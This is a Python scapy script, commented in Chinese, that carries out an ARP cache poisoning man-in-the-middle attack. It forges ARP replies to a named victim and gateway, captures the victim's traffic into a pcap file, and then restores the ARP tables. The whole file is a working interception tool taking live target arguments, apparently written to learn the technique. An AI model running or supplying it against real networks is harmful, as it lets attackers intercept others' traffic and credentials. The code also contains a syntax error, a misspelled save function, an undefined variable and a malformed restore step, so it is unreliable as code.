import sys
import time
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
# sending ARP requests and capturing the corresponding responses
from scapy.sendrecv import srp, sniff, send
from multiprocessing import Process
# Write a list of packets to a pcap file
from scapy.utils import wrpcap


def get_mac(target_ip):
    # 創建一個查詢數據包，數據包將會全網廣播
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst = target_ip)
    # 發送數據包
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        # 獲取設備的 mac 地址
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface="en0"):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f"Initialized {interface}:")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}")
        print(f"Victim ({victim}) is at {self.victimmac}")
        print("-", * 30)

    def run(self):
        # X害 ARP 緩存
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        # 嗅探網路流量，
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # 構建受害電腦的惡意 ARP 實驗數據包，從 gateway 發送到受害電腦
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway # gateway
        poison_victim.pdst = self.victim  # victim
        poison_victim.hwdst = self.victimmac # victimmac
        print(f"ip src: {poison_victim.psrc}")      # gateway
        print(f"ip dst: {poison_victim.pdst}")      # victim
        print(f"mac src: {poison_victim.hwsrc}")    # ARP
        print(f"mac dst: {poison_victim.hwdst}")    # victimmac
        
        print("-" * 30)

        # 構建 X 害 gateway 的惡意 ARP 數據包，從惡意電腦到 gateway
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
 
        print(f"ip src: {poison_gateway.psrc}")    # 惡意電腦
        print(f"ip dst: {poison_gateway.pdst}")    # gateway
        print(f"mac src: {poison_gateway.hwsrc}")  # ARP
        print(f"mac dst: {poison_gateway.hwdst}")  # gateway
        
        print(poison_gateway.summary())
        print("-" * 30)
        print(f"Beginning the ARP poison. [CTRL-C to stop]")

        # 循環發送惡意封包
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try: 
                send(poison_victim)
            except KeyboardInterrupt:
                # 將 gateway 狀態恢復到原樣(把正確資訊發送給受害電腦和 gateway ，還原投 X 攻擊前的狀態)
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
        
    def sniff(self, count=200):
        # 給投 X 線程留下足夠的時間
        time.sleep(5)
        print(f"Sniffing {count} packets")
        # 只嗅探受害者 IP 的數據包
        bpf_filter = "ip host %s" % victim
        # 指定嗅探的個數
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        # 將這些數據包存在 arper.pacp 文件中
        wrpacp("arper.pcap", packets)
        print("Got the packets")

        # 將 ARP 表中的數據還原為原來的值
        self.restore()
        self.poison_thread.terminate()
        print("Finished.")

    def restore(self):
        print("Restoring ARP tables...")
        # 把 gateway 原本的 IP 地址和 MAC 地址發給受害電腦
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # 把 受害電腦原本的 IP 地址和 MAC 地址發送給 gateway
        send(ARP(op=2, psrc=self.victim, hwsrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff"), count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()